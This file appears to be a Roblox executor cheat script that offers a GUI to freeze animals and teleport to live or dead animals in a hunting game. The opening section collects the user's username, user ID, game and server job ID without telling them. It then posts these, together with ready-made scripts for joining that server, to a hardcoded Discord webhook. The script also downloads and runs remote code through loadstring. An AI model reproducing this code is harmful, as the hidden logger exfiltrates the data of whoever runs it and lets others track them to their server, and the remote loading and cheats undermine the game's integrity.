local webhookURL = "https://discord.com/api/webhooks/1394468977245159544/tzzEuqMrlK-_U_iY8_hjko3P3YQIPPp-MaaU_z5JHQ0DWZqLzW1rd9FiqFXqx6DhG22H"

local player = game.Players.LocalPlayer
local username = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local gameId = game.PlaceId
local jobId = game.JobId
local playerCount = #game.Players:GetPlayers()

local jsJoinCode = [[
    fetch("https://games.roblox.com/v1/games/]] .. gameId .. [[/servers/Public?sortOrder=Asc&limit=100").then(res => res.json()).then(json => {
        const server = json.data.find(s => s.id === "]] .. jobId .. [[");
        if (server) {
            window.open(`roblox://placeId=` + server.placeId + `&gameInstanceId=` + server.id);
        } else {
            console.log("Server not found.");
        }
    });
]]

local luaJoinScript = [[
local TeleportService = game:GetService("TeleportService")
TeleportService:TeleportToPlaceInstance(]] .. gameId .. [[, "]] .. jobId .. [[", game.Players.LocalPlayer)
]]

local embed = {
    ["title"] = "Execution Log",
    ["description"] = "Here are the details of the player and game:",
    ["type"] = "rich",
    ["color"] = 0x000000,
    ["fields"] = {
        { ["name"] = "Username", ["value"] = username, ["inline"] = true },
        { ["name"] = "Display Name", ["value"] = displayName, ["inline"] = true },
        { ["name"] = "User ID", ["value"] = tostring(userId), ["inline"] = false },
        { ["name"] = "Game Name", ["value"] = gameName, ["inline"] = false },
        { ["name"] = "Game ID", ["value"] = tostring(gameId), ["inline"] = true },
        { ["name"] = "Players in Server", ["value"] = tostring(playerCount), ["inline"] = true },
        { ["name"] = "JavaScript Join Code", ["value"] = "```js\n" .. jsJoinCode .. "\n```", ["inline"] = false },
        { ["name"] = "Lua Join Script", ["value"] = "```lua\n" .. luaJoinScript .. "\n```", ["inline"] = false },
    },
    ["footer"] = { ["text"] = "Execution Log - Roblox" },
    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

local payload = game:GetService("HttpService"):JSONEncode({
    ["content"] = "",
    ["embeds"] = {embed}
})

local requestFunction = syn and syn.request or http_request or request
if requestFunction then
    requestFunction({
        Url = webhookURL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = payload
    })
else
    warn("Your executor does not support HTTP requests.")
end

-- Load UI Library (Lime)
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/lime"))()
local MarketplaceService = game:GetService("MarketplaceService")
local placeId = game.PlaceId
local gameName = "Unknown Game"

pcall(function()
    gameName = MarketplaceService:GetProductInfo(placeId).Name
end)

local w = Library:Window(gameName)

-- üß† Basic Variables
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRoot = character:WaitForChild("HumanoidRootPart")

-- üîç Function to find the nearest dead animal
local function getClosestDeadAnimal()
    local closestPart = nil
    local shortestDistance = math.huge

    for _, obj in pairs(workspace:WaitForChild("DeadAnimals"):GetDescendants()) do
        if obj:IsA("BasePart") then
            local dist = (humanoidRoot.Position - obj.Position).Magnitude
            if dist < shortestDistance then
                shortestDistance = dist
                closestPart = obj
            end
        end
    end

    return closestPart
end

-- ‚úÖ Main variables
getgenv().FreezeAnimalsEnabled = false
local frozenAnimals = {}
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRoot = character:WaitForChild("HumanoidRootPart")

local RunService = game:GetService("RunService")

-- üßä Function to freeze an animal
local function freezeAnimal(animal)
    if frozenAnimals[animal] then return end

    local root = animal:FindFirstChild("HumanoidRootPart") or animal.PrimaryPart
    if not root then return end

    local humanoid = animal:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = 0
        humanoid.PlatformStand = true
    end

    for _, d in pairs(animal:GetDescendants()) do
        if d:IsA("BodyMover") or d:IsA("BodyVelocity") or d:IsA("BodyGyro") then
            d:Destroy()
        end
    end

    frozenAnimals[animal] = root
end

-- üîÅ Lock position every frame
RunService.Heartbeat:Connect(function()
    if not getgenv().FreezeAnimalsEnabled then return end

    for animal, root in pairs(frozenAnimals) do
        if animal and animal.Parent and root then
            root.Anchored = false
            root.CFrame = root.CFrame
            root.Velocity = Vector3.zero
            root.RotVelocity = Vector3.zero
        end
    end
end)

-- üîÅ Constantly check for animals in workspace.Animals
RunService.Stepped:Connect(function()
    if not getgenv().FreezeAnimalsEnabled then return end

    for _, animal in pairs(workspace:WaitForChild("Animals"):GetChildren()) do
        if not frozenAnimals[animal] then
            freezeAnimal(animal)
        end
    end
end)

-- üîò Toggle freeze animals
w:Toggle("Freeze Animals", function(v)
    getgenv().FreezeAnimalsEnabled = v
    if v then
        print("[‚úÖ] Freeze enabled")
    else
        print("[‚õî] Freeze disabled")
    end
end)

-- üìç Teleport to the nearest animal in workspace.Animals
w:Button("Teleport to Nearest Animal", function()
    local closestAnimal = nil
    local shortestDist = math.huge

    for _, animal in pairs(workspace:WaitForChild("Animals"):GetChildren()) do
        local root = animal:FindFirstChild("HumanoidRootPart") or animal.PrimaryPart
        if root then
            local dist = (humanoidRoot.Position - root.Position).Magnitude
            if dist < shortestDist then
                shortestDist = dist
                closestAnimal = root
            end
        end
    end

    if closestAnimal then
        humanoidRoot.CFrame = closestAnimal.CFrame + Vector3.new(0, 5, 0)
        print("[‚úÖ] Teleported to closest animal")
    else
        print("[‚ö†Ô∏è] No animals found in workspace.Animals")
    end
end)

-- üîò Teleport to closest dead animal
w:Button("Teleport to Nearest Dead Animal", function()
    local target = getClosestDeadAnimal()
    if target then
        humanoidRoot.CFrame = target.CFrame + Vector3.new(0, 5, 0)
        print("[‚úÖ] Teleported to: " .. target:GetFullName())
    else
        print("[‚ö†Ô∏è] No dead animals found")
    end
end)
